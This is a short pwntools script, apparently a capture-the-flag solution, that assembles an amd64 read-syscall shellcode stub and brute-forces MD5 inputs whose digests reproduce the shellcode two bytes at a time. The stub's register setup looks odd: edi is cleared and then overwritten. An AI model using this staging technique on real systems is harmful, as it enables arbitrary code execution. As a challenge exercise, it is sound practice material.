from pwn import *
import hashlib
import os
context.arch = 'amd64'
context.log_level = 'debug'
def find_md5_pair(x, y, max_attempts=10**8):
    if not (0 < x < 256):
        raise ValueError("x must be between 1 and 255")
    if not (0 < y < 256):
        raise ValueError("y must be between 1 and 255")
    attempts = 0
    while attempts < max_attempts:
        s = os.urandom(8)
        digest = hashlib.md5(s).digest()
        if digest[0] == x and digest[1] == y and digest[2] == 0:
            return s, digest
        attempts += 1

    return None, None
sc = asm('''
xor edi, edi
mov rsi, rax
xor eax, eax
mov rdi, 0x1014514
syscall
''')
sc = sc + b'\x90' * (len(sc) % 2)
print(sc)
for i in range(0, len(sc), 2):
    x = sc[i]
    y = sc[i+1]
    print(x,y)
    s, digest = find_md5_pair(x, y)
    assert s is not None, f"Failed to find md5, please run again"
    print(s)